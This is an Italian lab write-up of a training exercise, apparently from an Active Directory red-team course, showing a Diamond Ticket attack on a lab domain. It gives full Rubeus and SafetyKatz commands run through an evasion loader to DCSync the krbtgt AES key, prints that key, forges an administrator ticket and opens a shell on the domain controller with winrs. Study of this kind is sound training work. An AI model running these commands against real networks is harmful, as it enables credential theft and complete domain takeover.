# LEARNING OBJECTIVE10

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

• Use Domain Admin privileges obtained earlier to execute the Diamond\
Ticket attack.

### SVOLGIMENTO

Per poter ottenere un Diamond Ticket abbiamo bisogno della aeskey dell'account krbtgt, per ottenere questa chiave bisogna spawnare un prompt da DomainAdmin, usando svcadmin

Lanciamo cmd da amministratore ed eseguiamo

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Nel nuovo prompt possiamo recuperare la chiave krbtgt usando il seguente comando

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### krbtgt aeskey: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848

A questo punto apriamo un nuovo prompt elevato (run as administrator) ed forgiamo il Diamond TIcket

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nel nuovo processo cmd spawnato accediamo il dc usando winrs

```powershell
winrs -r:dcorp-dc cmd
```

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
